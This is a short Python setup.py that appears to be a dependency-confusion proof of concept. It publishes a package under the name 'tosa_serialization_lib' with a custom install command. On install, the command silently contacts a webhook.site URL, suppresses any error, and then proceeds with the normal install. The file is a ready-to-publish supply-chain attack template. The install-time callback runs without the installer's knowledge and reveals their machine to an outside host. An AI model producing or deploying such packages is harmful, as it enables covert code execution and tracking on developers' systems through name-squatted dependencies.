from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/e0d4789a-b2ff-4633-b377-623c2621cb5a"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="tosa_serialization_lib",
    version="2.0.0",
    packages=["tosa_serialization_lib"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
